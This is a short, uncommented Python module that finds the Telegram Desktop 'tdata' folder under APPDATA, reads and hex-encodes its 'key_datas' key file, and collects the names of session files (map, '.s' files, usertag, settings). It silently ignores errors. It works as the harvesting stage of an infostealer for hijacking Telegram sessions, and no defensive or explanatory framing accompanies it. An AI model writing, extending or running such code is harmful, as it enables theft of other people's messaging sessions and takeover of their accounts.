import os
import shutil
import tempfile
import sqlite3

TELEGRAM_PATHS = [
    os.path.join(os.environ.get("APPDATA", ""), "Telegram Desktop", "tdata"),
]


def extract_telegram_session(tdata_path: str) -> dict:
    result = {"path": tdata_path, "files": [], "key_data": None}
    if not os.path.exists(tdata_path):
        return result
    try:
        key_file = os.path.join(tdata_path, "key_datas")
        if os.path.exists(key_file):
            with open(key_file, "rb") as f:
                result["key_data"] = f.read().hex()

        map_file = os.path.join(tdata_path, "map")
        if os.path.exists(map_file):
            result["files"].append("map")

        for f in os.listdir(tdata_path):
            if f.endswith(".s"):
                result["files"].append(f)
            if f.startswith("usertag"):
                result["files"].append(f)
            if f == "settings0" or f == "settings1":
                result["files"].append(f)

        result["file_count"] = len(os.listdir(tdata_path))
    except Exception:
        pass
    return result


def extract_all() -> list[dict]:
    results = []
    for path in TELEGRAM_PATHS:
        r = extract_telegram_session(path)
        if r.get("key_data") or r.get("files"):
            results.append(r)
    return results
